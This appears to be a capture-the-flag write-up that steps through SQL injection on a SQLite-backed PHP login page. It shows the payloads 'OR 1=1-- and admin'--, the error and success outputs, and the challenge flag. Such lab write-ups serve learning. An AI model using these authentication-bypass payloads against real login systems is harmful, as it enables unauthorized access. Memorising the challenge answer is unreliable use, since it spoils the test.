# INFO

We're in a login page. So it's probably SQL injection attack, let's make a test payload.

`login = 'admin--`
`password = 'admin--`

Ouput :

`Warning: SQLite3::query(): Unable to prepare statement: 1, near "admin": syntax error in /var/www/coffee/index.php on line 23 Fatal error: Uncaught Error: Call to a member function fetchArray() on bool in /var/www/coffee/index.php:24 Stack trace: #0 {main} thrown in /var/www/coffee/index.php on line 24`

SQLite error. So we've a PoC. Let's exploit it.

# First payload (failed)

We want to login as admin so :

`login = admin`
`password = 'OR 1=1--` --> Basic payload for sql injection to make the test true when it looks at the password = our_input

Output :

`Hello user1<br>Your message: I want coffee...  `

Bad response, we want to be admin...
Let's try an other way.

# Second Payload (Good one)

The idea is the following: our login gonna be admin, and we want to stop the filter there (-> without checking for password)

`login = admin'--` --> in the SQL code that makes: `Select * from users where username='admin'–' and password='WHATEVER';` and the -- make the end of the line as a comment.
`password = WHATEVER`

Output :

`Hello admin<br>Your message: Coffee code: horiz0nx{$uper_c00ffeeeee_c0deee}` 


# Gotcha !

horiz0nx{$uper_c00ffeeeee_c0deee}